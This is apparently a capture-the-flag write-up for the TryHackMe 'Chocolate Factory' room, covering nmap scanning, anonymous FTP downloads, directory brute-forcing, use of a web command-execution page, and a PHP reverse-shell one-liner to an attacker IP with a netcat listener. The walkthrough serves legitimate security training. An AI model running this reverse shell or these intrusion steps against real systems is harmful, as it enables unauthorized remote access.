# Chocolate Factory

**Room Link:** [https://tryhackme.com/room/chocolatefactory](https://tryhackme.com/room/chocolatefactory)



### Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

### Scan all ports

No other ports found

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

### TCP/21 - FTP

**Kali**

```
ftp $VICTIM
Username: anonymous
>binary
>passive
>mget *
```

<figure><img src="../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

### TCP/80 - HTTP

**Kali**

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

We can run commands here and we see the key\_rev\_key file

![](<../../.gitbook/assets/image (2).png>)



We go there by the url and we can download it

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
strings key_rev_key
```

<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>



Let\u2019s try to get reverse shell

php -r '$sock=fsockopen("10.2.12.26",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

Start netcat listener

nc -lvp 4444









































































